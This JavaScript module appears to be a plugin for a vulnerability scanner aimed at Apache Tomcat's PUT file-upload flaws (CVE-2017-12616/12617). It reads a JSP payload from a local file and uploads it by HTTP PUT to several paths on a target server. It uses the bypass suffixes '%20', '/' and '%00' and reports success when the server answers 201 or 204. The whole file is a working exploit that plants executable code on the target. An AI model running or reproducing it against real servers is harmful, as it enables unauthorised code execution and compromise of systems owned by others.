module.exports={
	tags:"tomcat,CVE-2017-12616,12616,CVE-2017-12617,12617,12616",
	des:"tomcat,Vulnerability detection",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-12616",
		"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12616",
		"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617",
		'https://bz.apache.org/bugzilla/show_bug.cgi?id=61542'],
	urls:[
		"https://tomcat.apache.org/security-7.html"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self,szCode = _s.fs.readFileSync(__dirname + "/../../payload/x.jsp").toString(),
			szOld = url.substr(0, url.indexOf("/",11)),
			nLst = url.lastIndexOf('/',10),
		    aUrls = [10 > nLst ? url : url.substr(0, nLst + 1),szOld,szOld + "/examples/",szOld + "/manager/"],
		    oT = {"tags":_t.tags,"url":url},n = 0,xCnt = 0;
		// console.log(szCode)
		var fnTmpFc = function(szUrl9)
		{
			if(15 > szUrl9.length)
			{
				// console.log([szUrl9 + "???",url,nLst]);
				n++;
				return;
			}
			var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
			var fnPt = function(u)
			{
				// console.log(u);
				_s.request({method:"put","uri":u,"body":szCode,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
				{
					_s.error(e);
					n++;
					// console.log(r.statusCode + ": " + u);
					if(e);//_s.error(e);
					// console.log([u,r.statusCode,r.headers["location"],e||b]);
					else if(r && (201 == r.statusCode || 204 == r.statusCode))
					{
						oT.vul = true;
						oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
					}
					if(n >= xCnt)fnCbk(oT,_t);
				});
			};
			for(var k in a)
				fnPt(szUrl9 + a[k]);	
		};
		xCnt = aUrls.length * 4;
		for(var k in aUrls)
		{//console.log(aUrls[k]);
			fnTmpFc(aUrls[k]);
		}
	}
};